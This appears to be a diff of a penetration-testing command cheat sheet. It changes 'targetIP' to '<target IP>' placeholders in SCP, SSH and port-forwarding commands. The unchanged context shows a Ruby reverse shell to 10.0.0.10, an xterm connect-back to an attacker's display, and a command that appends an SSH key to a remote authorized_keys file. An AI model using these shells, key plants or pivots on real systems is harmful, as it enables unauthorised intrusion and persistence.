@@ -26,12 +26,12 @@ zip -r test.zip test/
 
 # Copy Files (remotely)
  
-scp /path/to/local/file.txt user@targetIP:/path/to/share     Local to remote
-scp -r user@targetIP:/path/to/share /local/share             Remote to local
+scp /path/to/local/file.txt user@<target IP>:/path/to/share     Local to remote
+scp -r user@<target IP>:/path/to/share /local/share             Remote to local
 
 # Append File (remotely)
 
-cat ~/.ssh/id_rsa.pub | ssh user@targetIP 'cat >> .ssh/authorized_keys'
+cat ~/.ssh/id_rsa.pub | ssh user@<target IP> 'cat >> .ssh/authorized_keys'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Date & Time
@@ -338,7 +338,7 @@ ruby -rsocket -e'f=TCPSocket.open("10.0.0.10",443).to_i;exec sprintf("/bin/sh -i
 - xterm
 xterm -display 10.0.0.10:1                      target - it will connect back to you on TCP port 6001
 Xnest :1                                        attacker - catch the incoming xterm, start an X-Server
-xhost +targetIP                                 attacker - authorize the target to connect to you
+xhost +<target IP>                              attacker - authorize the target to connect to you
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Screen
@@ -368,24 +368,25 @@ ssh-keygen                                      Generate new public/private key 
 -rw-------  identity_file
 -rw-r--r--  known_hosts
 
-ssh root@targetIP                               Connect as root on a standard port
-ssh targetIP                                    Connect with no user name on a standard port
-ssh root@targetIP -p 2222                       Connect as root on a non-standard port
-ssh root@targetIP -i key                        Connect as root and authenticate using an identity file
+ssh root@<target IP>                            Connect as root on a standard port
+ssh <target IP>                                 Connect with no user name on a standard port
+ssh root@<target IP> -p 2222                    Connect as root on a non-standard port
+ssh root@<target IP> -i key                     Connect as root and authenticate using an identity file
 
 - Local port forward
 ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
-ssh user@targetIP -L 5900:localhost:5900
+ssh user@<target IP> -L 5900:localhost:5900
 
 - Remote port forwarding
 ssh <gateway> -R <remote port to bind>:<local host>:<local port>
-ssh user@targetIP -R 2222:localhost:22 -f -N
+ssh user@<target IP> -R 2222:localhost:22 -f -N
                                                 -f   Force to background
                                                 -N   Do not execute a remote command
 
 - Dynamic port forward
-ssh <target> -D <local proxy port>
-ssh user@targetIP -C -D 1080                    -C   Enable compression, good for web browsing
+ssh -D <local proxy port> -p <remote port> <target>
+ssh -D <local proxy port> <target IP>
+ssh user@<target IP> -C -D 1080                 -C   Enable compression, good for web browsing
                                                 -D   Create a SOCKS tunnel on the default port
 
 Firefox Preferences > Advanced > Network > Settings > Manual proxy configuration
@@ -401,7 +402,7 @@ ForwardX11Trusted yes                           Uncomment
 service ssh restart
 export DISPLAY=localhost:0.0
 exit
-ssh user@targetIP -Y                            Connect and use X11 forwarding
+ssh user@<target IP> -Y                         Connect and use X11 forwarding
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Startup Services
